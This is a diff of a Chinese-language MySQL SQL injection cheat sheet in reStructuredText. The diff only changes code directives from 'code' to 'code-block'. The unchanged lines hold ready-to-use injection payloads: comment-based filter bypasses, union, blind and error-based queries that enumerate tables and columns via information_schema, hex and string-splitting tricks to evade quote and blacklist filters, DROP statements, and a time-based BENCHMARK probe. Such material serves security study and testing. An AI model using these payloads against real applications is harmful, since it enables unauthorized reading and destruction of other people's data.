@@ -38,13 +38,13 @@ SQL 注入
 
 -  ``--``
    
-   .. code::sql
+   .. code-block::sql
 
       DROP sampletable;--
 
 -  ``#``
 
-   .. code::sql
+   .. code-block::sql
 
       DROP sampletable;#
 
@@ -53,13 +53,13 @@ SQL 注入
 
 -  ``/*注释内容*/``
    
-   .. code:: sql
+   .. code-block:: sql
 
       DROP/*comment*/sampletable`   DR/**/OP/*绕过过滤*/sampletable`   SELECT/*替换空格*/password/**/FROM/**/Members
 
 -  ``/*! MYSQL专属 */``
 
-   .. code:: sql
+   .. code-block:: sql
 
       SELECT /*!32302 1/0, */ 1 FROM tablename
 
@@ -88,7 +88,7 @@ SQL 注入
 数据库名
 ~~~~~~~~
 
-.. code:: sql
+.. code-block:: sql
 
     SELECT database();
     SELECT schema_name FROM information_schema.schemata;
@@ -98,7 +98,7 @@ SQL 注入
 
 -  union 查询
 
-   .. code:: sql
+   .. code-block:: sql
 
       --MySQL 4版本时用version=9，MySQL 5版本时用version=10
       UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE version=10;   /* 列出当前数据库中的表 */
@@ -107,13 +107,13 @@ SQL 注入
 
 -  盲注
 
-   .. code:: sql
+   .. code-block:: sql
 
       AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables > 'A'
 
 -  报错
 
-   .. code:: sql
+   .. code-block:: sql
 
       AND(SELECT COUNT(*) FROM (SELECT 1 UNION SELECT null UNION SELECT !1)x GROUP BY CONCAT((SELECT table_name FROM information_schema.tables LIMIT 1),FLOOR(RAND(0)*2))) (@:=1)||@ GROUP BY CONCAT((SELECT table_name FROM information_schema.tables LIMIT 1),!@) HAVING @||MIN(@:=0); AND ExtractValue(1, CONCAT(0x5c, (SELECT table_name FROM information_schema.tables LIMIT 1)));
       -- 在5.1.5版本中成功。
@@ -123,19 +123,19 @@ SQL 注入
 
 -  union 查询
 
-   .. code:: sql
+   .. code-block:: sql
 
       UNION SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name = 'tablename'
 
 -  盲注
 
-   .. code:: sql
+   .. code-block:: sql
 
       AND SELECT SUBSTR(column_name,1,1) FROM information_schema.columns > 'A'
 
 -  报错
 
-   .. code:: sql
+   .. code-block:: sql
 
       -- 在5.1.5版本中成功
       AND (1,2,3) = (SELECT * FROM SOME_EXISTING_TABLE UNION SELECT 1,2,3 LIMIT 1)
@@ -144,7 +144,7 @@ SQL 注入
 
 -  利用 ``PROCEDURE ANALYSE()``
 
-   .. code:: sql
+   .. code-block:: sql
 
       -- 这个需要 web 展示页面有你所注入查询的一个字段
       -- 获得第一个段名
@@ -157,7 +157,7 @@ SQL 注入
 根据列名查询所在的表
 ~~~~~~~~~~~~~~~~~~~~
 
-.. code:: sql
+.. code-block:: sql
 
     -- 查询字段名为 username 的表
     SELECT table_name FROM information_schema.columns WHERE column_name = 'username';
@@ -167,7 +167,7 @@ SQL 注入
 绕过引号限制
 ~~~~~~~~~~~~
 
-.. code:: sql
+.. code-block:: sql
 
     -- hex 编码
     SELECT * FROM Users WHERE username = 0x61646D696E
@@ -177,7 +177,7 @@ SQL 注入
 绕过字符串黑名单
 ~~~~~~~~~~~~~~~~
 
-.. code:: sql
+.. code-block:: sql
 
     SELECT 'a' 'd' 'mi' 'n';
     SELECT CONCAT('a', 'd', 'm', 'i', 'n');
@@ -191,7 +191,7 @@ SQL 注入
 
 ``CASE``, ``IF()``, ``IFNULL()``, ``NULLIF()``.
 
-.. code:: sql
+.. code-block:: sql
 
     SELECT IF(1=1, true, false);
     SELECT CASE WHEN 1=1 THEN true ELSE false END;
@@ -201,7 +201,7 @@ SQL 注入
 
 ``SLEEP()``, ``BENCHMARK()``.
 
-.. code:: sql
+.. code-block:: sql
 
     ' - (IF(MID(version(),1,1) LIKE 5, BENCHMARK(100000,SHA1('true')), false)) - '
 
